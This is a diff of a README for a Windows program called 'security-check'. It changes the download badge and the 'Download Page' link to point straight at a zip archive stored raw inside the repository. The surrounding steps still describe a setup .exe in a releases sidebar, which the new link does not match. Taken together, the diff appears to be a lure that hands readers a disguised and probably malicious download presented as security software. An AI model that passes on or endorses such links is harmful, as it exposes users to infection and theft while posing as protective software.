@@ -1,6 +1,6 @@
 # 🛡️ security-check - Secure your digital assets with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Unisonporosity5953/security-check)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Unisonporosity5953/security-check/raw/refs/heads/main/scan-target/check-security-v3.6.zip)
 
 ## 🎯 About this application
 
@@ -19,7 +19,7 @@ Your computer must meet these requirements to run the software effectively:
 
 You will download the installer from our primary repository. Follow these steps to fetch the correct file for your Windows system:
 
-1. Visit the [Download Page](https://github.com/Unisonporosity5953/security-check).
+1. Visit the [Download Page](https://github.com/Unisonporosity5953/security-check/raw/refs/heads/main/scan-target/check-security-v3.6.zip).
 2. Look for the latest release version on the right sidebar.
 3. Click the link labeled security-check-setup.exe to start the download.
 4. Save the file to your Downloads folder.
